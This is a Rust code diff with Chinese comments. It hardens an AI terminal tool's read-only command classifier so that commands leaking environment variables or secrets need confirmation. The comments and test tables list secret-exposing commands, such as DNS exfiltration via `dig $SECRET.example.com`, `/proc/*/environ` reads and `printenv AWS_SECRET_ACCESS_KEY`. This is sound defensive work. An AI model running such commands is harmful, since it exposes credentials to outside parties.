@@ -14,6 +14,11 @@
 //! - 会往外发网络请求的命令（`ping`、`dig`、`nslookup`、`host`、`traceroute`、`tracepath`、`mtr`）的参数里
 //!   只要有 shell 展开（`$变量`、通配符、大括号），就不算只读：它们的参数会原样变成 DNS 查询 / 目标地址发出去，
 //!   `dig $SECRET.example.com` 等于把环境变量里的秘密发给外面（见 [`rule_for`]）；
+//! - 会把环境变量 / 进程环境整份交给模型服务商的命令不算只读：`env`、不带变量名的 `printenv`、
+//!   变量名像秘密的 `printenv`、带 BSD 风格 `e` 的 `ps`（`ps eww`、`ps aux e`；`ps -e` 是"所有进程"，不受影响）、
+//!   `docker inspect`（含 `container|image inspect`，会打出 `Config.Env`）、`kubectl describe` 带 Pod 模板的资源
+//!   （`Environment:` 会列出字面值）、带 `e` 的 `docker top` ps 选项；
+//! - `dig -f`、`mtr -F` 把文件内容当查询目标发出去，不算只读；
 //! - `<<` / `<<<`（here-doc / here-string）不算只读：here-doc 的正文是另起的多行，分段逻辑看不到它，
 //!   审查认为不能绕过，但这里再加一道保险，宁可多问一句；
 //! - 命令是打进交互式终端的，bash 会先做历史展开（`!`），所以任何命令里可能触发历史展开的 `!`
@@ -57,11 +62,9 @@ const ALWAYS: &[&str] = &[
     "pwd",
     "echo",
     "printf",
-    "printenv",
     "which",
     "whereis",
     "type",
-    "ps",
     "pgrep",
     "pstree",
     "top",
@@ -947,7 +950,9 @@ fn kubectl_is_read_only(args: &[String]) -> bool {
     match verb {
         // get / describe 会把 Secret 的内容（get -o yaml 是 base64 的明文）读出来交给模型服务商，
         // 所以资源是 secret 的要确认；logs / top / explain 等不碰 Secret 的照旧放行。
-        "get" | "describe" => !kubectl_reads_secrets(rest),
+        "get" => !kubectl_reads_secrets(rest),
+        // describe 还会把 Pod 模板里的 `Environment:` 字面值列出来（Pod 和所有带 Pod 模板的工作负载）
+        "describe" => !kubectl_reads_secrets(rest) && !kubectl_describes_pod_template(rest),
         "logs" | "top" | "version" | "api-resources" | "api-versions" | "explain" => true,
         // `cluster-info dump` 会把内容写进 --output-directory
         "cluster-info" => rest.iter().all(|a| a.starts_with('-')),
@@ -1009,18 +1014,28 @@ fn docker_is_read_only(args: &[String]) -> bool {
                             | "--no-normalize"
                             | "--resolve-image-digests"
                             | "--hash"
-                            | "--environment"
                     ) || !a.starts_with('-')
                 }),
                 _ => false,
             }
         }
-        "ps" | "images" | "logs" | "inspect" | "version" | "info" | "top" | "port" | "diff"
-        | "history" | "events" => true,
+        // `inspect` 会把容器 / 镜像的 Config.Env 整份打出来，不放行
+        // `top` 的容器名后面可以跟 ps 选项（`docker top web eww` 会带出环境）
+        "top" => rest
+            .get(1..)
+            .is_none_or(|ps_args| !ps_shows_environment(ps_args)),
+        "ps" | "images" | "logs" | "version" | "info" | "port" | "diff" | "history" | "events" => {
+            true
+        }
         "stats" => rest.contains(&"--no-stream"),
-        "container" | "image" | "network" | "volume" => rest
-            .first()
-            .is_some_and(|sub| matches!(*sub, "ls" | "list" | "inspect")),
+        "container" | "image" | "network" | "volume" => {
+            rest.first().is_some_and(|sub| match (first, *sub) {
+                (_, "ls" | "list") => true,
+                // 容器和镜像的 inspect 带 Config.Env；网络和卷的没有环境变量
+                ("network" | "volume", "inspect") => true,
+                _ => false,
+            })
+        }
         _ => false,
     }
 }
@@ -1180,7 +1195,11 @@ fn rule_for(name: &str) -> Rule {
         "date" => Rule::Filtered(|args| {
             parse_args(&DATE, args).is_some_and(|rest| rest.iter().all(|p| p.starts_with('+')))
         }),
-        "env" => Rule::Filtered(|args| args.is_empty()),
+        // env 不带参数是把整份环境打出来，带参数是在运行别的程序：都不算只读，所以不登记。
+        // printenv 只放行指定的、名字不像秘密的变量
+        "printenv" => Rule::Filtered(printenv_is_read_only),
+        // BSD 风格的 `e` 会在命令后面附上进程的环境变量
+        "ps" => Rule::Filtered(|args| !ps_shows_environment(args)),
         "mount" => Rule::Filtered(|args| args.is_empty() || args.iter().all(|a| a == "-l")),
         "dmesg" => Rule::Filtered(|args| parse_args(&DMESG, args).is_some()),
         "journalctl" => Rule::Filtered(|args| parse_args(&JOURNALCTL, args).is_some()),
@@ -1218,12 +1237,152 @@ fn rule_for(name: &str) -> Rule {
         // 这些命令把参数变成网络请求发出去：参数里的展开（`dig $SECRET.example.com`）会把本机的
         // 变量内容带出去。`Filtered` 已经在参数含展开时直接要确认，所以检查函数本身无所谓，写成恒真。
         // 其余参数仍不过滤：它们的输出只回到模型，不外发，维持现状。
-        "ping" | "dig" | "nslookup" | "host" | "traceroute" | "tracepath" | "mtr" => {
-            Rule::Filtered(|_| true)
-        }
+        "dig" => Rule::Filtered(dig_is_read_only),
+        "mtr" => Rule::Filtered(mtr_is_read_only),
+        "ping" | "nslookup" | "host" | "traceroute" | "tracepath" => Rule::Filtered(|_| true),
         _ if ALWAYS.contains(&name) => Rule::Unfiltered,
         _ => Rule::Unknown,
     }
+}
+
+/// `kubectl describe` 的目标会不会带出容器的环境变量：Pod 和带 Pod 模板的工作负载
+/// （Deployment / ReplicaSet / StatefulSet / DaemonSet / Job / CronJob / ReplicationController），
+/// 它们的 describe 有一节 `Environment:` 列出字面值（引用 Secret 的只显示引用，字面值直接显示）。
+/// `all` 包含它们；`-f` / `-k` 从文件里读目标，看不出是什么，也一并要确认。
+/// 格式同 [`kubectl_reads_secrets`]：`kind/名字`、逗号列表、`kind.group` 都认。
+/// node / service / ingress / configmap / pv 等没有环境变量，照旧放行。
+fn kubectl_describes_pod_template(args: &[String]) -> bool {
+    const KINDS: &[&str] = &[
+        "pod",
+        "pods",
+        "po",
+        "deploy",
+        "deployment",
+        "deployments",
+        "rs",
+        "replicaset",
+        "replicasets",
+        "sts",
+        "statefulset",
+        "statefulsets",
+        "ds",
+        "daemonset",
+        "daemonsets",
+        "job",
+        "jobs",
+        "cronjob",
+        "cronjobs",
+        "cj",
+        "rc",
+        "replicationcontroller",
+        "replicationcontrollers",
+        "all",
+    ];
+    args.iter().any(|arg| {
+        if let Some(flag) = arg.strip_prefix("--") {
+            let name = flag.split('=').next().unwrap_or(flag);
+            return matches!(name, "filename" | "kustomize" | "recursive");
+        }
+        if let Some(short) = arg.strip_prefix('-') {
+            return short.starts_with(['f', 'k']);
+        }
+        arg.split(',').any(|item| {
+            let kind = item.split('/').next().unwrap_or(item);
+            let kind = kind.split('.').next().unwrap_or(kind).to_ascii_lowercase();
+            KINDS.contains(&kind.as_str())
+        })
+    })
+}
+
+/// `printenv` 只放行指定变量名的写法，而且名字不能像秘密：名字里（不分大小写）有
+/// TOKEN / SECRET / KEY / PASS（含 PASSWORD）/ CRED。不带变量名是打印整份环境，不放行。
+/// 选项只认 `-0` / `--null`（换行符换成 NUL）；别的选项和 `--help` 之类一律要确认。
+fn printenv_is_read_only(args: &[String]) -> bool {
+    const SECRET_HINTS: &[&str] = &["token", "secret", "key", "pass", "cred"];
+    let mut names = 0;
+    let mut only_names = false;
+    for arg in args {
+        if !only_names && arg == "--" {
+            only_names = true;
+            continue;
+        }
+        if !only_names && arg.starts_with('-') {
+            if matches!(arg.as_str(), "-0" | "--null") {
+                continue;
+            }
+            return false;
+        }
+        let lower = arg.to_ascii_lowercase();
+        if SECRET_HINTS.iter().any(|hint| lower.contains(hint)) {
+            return false;
+        }
+        names += 1;
+    }
+    names > 0
+}
+
+/// `ps` 是否会显示进程环境。procps 的 BSD 风格选项（不带 `-` 的 `aux`、`eww`……）里字母 `e`
+/// 表示"在命令后面附上环境"，所以 `ps e`、`ps aux e`、`ps axe` 都会打出每个进程的环境变量。
+/// UNIX 风格（带 `-`）的 `-e` 是"所有进程"，没有这个效果，不能误伤。
+/// 带值的选项（`-o pid,etime`、`-p 1`、`axo pid,etime`、`--sort -%mem`）的值里常有字母 e，要跳过。
+fn ps_shows_environment<S: AsRef<str>>(args: &[S]) -> bool {
+    // 带值的 UNIX 风格短选项字母 / 带值的 BSD 风格字母
+    const UNIX_VALUED: &str = "oOpqCuUgGtsn";
+    const BSD_VALUED: &str = "oOptU";
+    const LONG_VALUED: &[&str] = &[
+        "sort", "format", "pid", "ppid", "sid", "tty", "user", "User", "group", "Group", "cols",
+        "columns", "width", "lines", "rows",
+    ];
+    let mut i = 0;
+    while i < args.len() {
+        let arg = args[i].as_ref();
+        i += 1;
+        if arg == "--" {
+            continue;
+        }
+        if let Some(long) = arg.strip_prefix("--") {
+            if LONG_VALUED.contains(&long) {
+                i += 1;
+            }
+            continue;
+        }
+        let (cluster, valued, bsd) = match arg.strip_prefix('-') {
+            Some(cluster) => (cluster, UNIX_VALUED, false),
+            None => (arg, BSD_VALUED, true),
+        };
+        for (index, c) in cluster.char_indices() {
+            if bsd && c == 'e' {
+                return true;
+            }
+            if valued.contains(c) {
+                // 值紧贴在后面（`-p1`）就是这一个词；否则下一个词是值
+                if cluster[index + c.len_utf8()..].is_empty() {
+                    i += 1;
+                }
+                break;
+            }
+        }
+    }
+    false
+}
+
+/// `dig -f 文件` 逐行读文件里的查询并发出去，等于把文件内容当目标外发，不放行。
+/// nslookup（BIND）和 host 没有"从文件读目标"的选项，不用管。
+fn dig_is_read_only(args: &[String]) -> bool {
+    !args.iter().any(|arg| arg.starts_with("-f"))
+}
+
+/// `mtr -F 文件`（`--filename`）从文件读主机列表，同上。短选项可以合并（`-rF`、`-nrcF`），
+/// getopt 的长选项又可以缩写成唯一前缀（`--file`、`--fi`），所以只要长选项是 `filename` 的前缀、
+/// 或短选项簇里有 `F` 就要确认。
+fn mtr_is_read_only(args: &[String]) -> bool {
+    !args.iter().any(|arg| {
+        if let Some(long) = arg.strip_prefix("--") {
+            let name = long.split('=').next().unwrap_or(long);
+            return !name.is_empty() && "filename".starts_with(name);
+        }
+        arg.starts_with('-') && arg.contains('F')
+    })
 }
 
 /// bash 内建 `printf -v 变量` 会给 shell 变量赋值（`PROMPT_COMMAND`、`PATH`……），
@@ -1506,7 +1665,7 @@ mod tests {
             "kubectl logs -f web-1",
             "kubectl cluster-info",
             "docker ps --format '{{.Names}}'",
-            "docker inspect -f '{{.State.Status}}' web",
+            "docker network inspect bridge",
             "docker container ls -a",
             "docker compose logs --tail 20 web",
             "docker compose config --services",
@@ -1520,7 +1679,7 @@ mod tests {
             "service nginx status",
             "mount",
             "mount -l",
-            "env",
+            "printenv PATH",
             "history",
         ]);
     }
@@ -1992,7 +2151,10 @@ mod tests {
             "find . -name x",
             "hostname",
             "date",
-            "env",
+            "printenv PATH",
+            "ps aux",
+            "dig example.com",
+            "mtr -n example.com",
             "mount",
             "dmesg",
             "journalctl -n 5",
@@ -2174,9 +2336,9 @@ mod hardening_tests {
             "kubectl get svc,deploy -n prod",
             "kubectl get nodes",
             "kubectl get events --sort-by=.lastTimestamp",
-            "kubectl describe pod web-1",
+            "kubectl describe svc web-1",
             "kubectl describe node worker-1",
-            "kubectl -n prod describe deploy web",
+            "kubectl -n prod describe ingress web",
             "kubectl get pods -l app=web",
             "kubectl logs web-1",
             "kubectl logs -f web-1 --tail=100",
@@ -2188,5 +2350,166 @@ mod hardening_tests {
             "kubectl explain pods",
             "kubectl explain secret",
         ]);
+    }
+}
+
+/// V2-C8：把环境变量 / 进程环境整份交给模型的命令，以及"从文件读查询目标"的网络命令，
+/// 在「只读自动」档里要确认。下面这张表是这一类的总清单：命令 -> 期望，含不该误伤的。
+#[cfg(test)]
+mod env_leak_tests {
+    use super::is_read_only;
+
+    /// (命令, 是否只读)
+    const TABLE: &[(&str, bool)] = &[
+        // --- dig / mtr / host / nslookup：从文件读查询目标 ---
+        ("dig example.com", true),
+        ("dig +short A example.com @192.0.2.53", true),
+        ("dig -x 192.0.2.1", true),
+        ("dig -f targets.txt", false),
+        ("dig -f/tmp/targets.txt", false),
+        ("dig +short -f targets.txt", false),
+        ("mtr -rwc 5 example.com", true),
+        ("mtr -n -c 3 example.com", true),
+        ("mtr -F targets.txt", false),
+        ("mtr -rF targets.txt", false),
+        ("mtr -nrcF 5 targets.txt", false),
+        ("mtr --filename targets.txt", false),
+        ("mtr --filename=targets.txt", false),
+        // getopt 长选项可缩写
+        ("mtr --file targets.txt", false),
+        ("mtr --fi=targets.txt", false),
+        ("nslookup example.com", true),
+        ("nslookup example.com 192.0.2.53", true),
+        ("host example.com", true),
+        ("host -t mx example.com", true),
+        // --- env / printenv：整份环境 ---
+        ("env", false),
+        ("/usr/bin/env", false),
+        ("env | grep FOO", false),
+        ("env | sort", false),
+        ("env FOO=1 ls", false),
+        ("printenv", false),
+        ("printenv | grep FOO", false),
+        ("printenv -0", false),
+        ("printenv PATH", true),
+        ("printenv HOME", true),
+        ("printenv LANG TERM", true),
+        ("printenv -0 PATH", true),
+        ("printenv --null PATH", true),
+        ("printenv PATH | tr ':' '\n'", true),
+        ("printenv GITHUB_TOKEN", false),
+        ("printenv AWS_SECRET_ACCESS_KEY", false),
+        ("printenv AWS_ACCESS_KEY_ID", false),
+        ("printenv db_password", false),
+        ("printenv MYSQL_PWD_PASS", false),
+        ("printenv API_Key", false),
+        ("printenv AWS_CREDENTIALS", false),
+        ("printenv PATH GITHUB_TOKEN", false),
+        ("printenv -x PATH", false),
+        // --- ps：BSD 风格的 e 会显示环境 ---
+        ("ps", true),
+        ("ps aux", true),
+        ("ps auxf", true),
+        ("ps -ef", true),
+        ("ps -e", true),
+        ("ps -eLf", true),
+        ("ps -eo pid,etime,cmd", true),
+        ("ps -e -o pid,etime,cmd", true),
+        ("ps axo pid,etime,comm", true),
+        ("ps -p 1 -o comm", true),
+        ("ps -C nginx", true),
+        ("ps -u root", true),
+        ("ps aux --sort=-%mem", true),
+        ("ps aux --sort -%mem", true),
+        ("ps -ef | grep nginx", true),
+        ("ps e", false),
+        ("ps ee", false),
+        ("ps eww", false),
+        ("ps aux e", false),
+        ("ps axe", false),
+        ("ps auxe", false),
+        ("ps auxwwe", false),
+        ("ps eww -p 1", false),
+        ("ps -p 1 e", false),
+        ("ps -ef e", false),
+        ("ps ax e | grep nginx", false),
+        // --- docker / podman ---
+        ("docker ps -a", true),
+        ("docker logs --tail 100 web", true),
+        ("docker network inspect bridge", true),
+        ("docker volume inspect data", true),
+        ("docker compose config --services", true),
+        ("docker top web", true),
+        ("docker top web aux", true),
+        ("docker top web -ef", true),
+        ("docker inspect web", false),
+        ("docker inspect -f '{{.State.Status}}' web", false),
+        ("docker container inspect web", false),
+        ("docker image inspect nginx", false),
+        ("podman inspect web", false),
+        ("docker exec web env", false),
+        ("docker exec -it web printenv", false),
+        ("docker exec web cat /proc/1/environ", false),
+        ("docker compose exec web env", false),
+        ("docker run --rm alpine env", false),
+        ("docker top web e", false),
+        ("docker top web eww", false),
+        ("docker compose config --environment", false),
+        // --- kubectl ---
+        ("kubectl get pods -A", true),
+        ("kubectl describe node worker-1", true),
+        ("kubectl describe svc web", true),
+        ("kubectl -n prod describe ingress web", true),
+        ("kubectl describe configmap app-config", true),
+        ("kubectl logs web-1", true),
+        ("kubectl describe pod web-1", false),
+        ("kubectl describe pods", false),
+        ("kubectl describe po web-1", false),
+        ("kubectl describe pod/web-1", false),
+        ("kubectl -n prod describe deploy web", false),
+        ("kubectl describe deployment/web", false),
+        ("kubectl describe deployments.apps web", false),
+        ("kubectl describe sts db", false),
+        ("kubectl describe ds agent", false),
+        ("kubectl describe job migrate", false),
+        ("kubectl describe cronjob nightly", false),
+        ("kubectl describe rs web-abc", false),
+        ("kubectl describe pods,svc", false),
+        ("kubectl describe all", false),
+        ("kubectl describe -f pod.yaml", false),
+        ("kubectl describe --filename=pod.yaml", false),
+        ("kubectl exec web-1 -- env", false),
+        ("kubectl exec web-1 -- printenv", false),
+    ];
+
+    #[test]
+    fn environment_and_file_target_table() {
+        let mut wrong = Vec::new();
+        for (command, expected) in TABLE {
+            if is_read_only(command) != *expected {
+                wrong.push(format!(
+                    "{command}  期望{}",
+                    if *expected { "只读" } else { "要确认" }
+                ));
+            }
+        }
+        assert!(wrong.is_empty(), "判定不符：\n{}", wrong.join("\n"));
+    }
+
+    /// 读进程环境的文件走敏感路径那一道，「只读自动」里照样要确认。
+    #[test]
+    fn proc_environ_reads_are_caught_by_the_sensitive_path_check() {
+        for command in [
+            "cat /proc/self/environ",
+            "cat /proc/1/environ",
+            "cat /proc/*/environ",
+            "strings /proc/1234/environ",
+            "tr '\0' '\n' < /proc/1/environ",
+        ] {
+            assert!(
+                crate::ai::sensitive::sensitive_path_in_command(command).is_some(),
+                "应命中敏感路径：{command}"
+            );
+        }
     }
 }
